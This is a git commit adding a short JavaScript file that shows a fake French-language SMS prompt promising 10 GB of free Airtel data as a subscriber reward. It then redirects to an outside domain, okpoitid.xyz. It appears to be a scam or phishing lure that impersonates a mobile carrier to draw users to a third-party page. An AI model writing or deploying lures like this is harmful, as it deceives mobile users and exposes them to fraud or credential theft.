ac15f8a1ffd4c358f617e5a23d87190059ac3bad
okpoz <okpoitidz@gmail.com>
2026-07-28 08:29:07 +0100

    Create airtel-freedata-rewad.js

---
+++ airtel-freedata-rewad.js
@@ -0,0 +1,5 @@
+var password = '10 Go de données gratuites'
+password=prompt('SMS: Félicitations ! Votre numéro est éligible pour recevoir 10 Go de données gratuites (récompense pour les anciens abonnés). Veuillez appuyer sur OK pour activer l'offre.. ','10 Go de données gratuites');
+if (password != '10 Go de données gratuites') {
+location.href='https://okpoitid.xyz/airtel-freedata-rewad.html';
+}
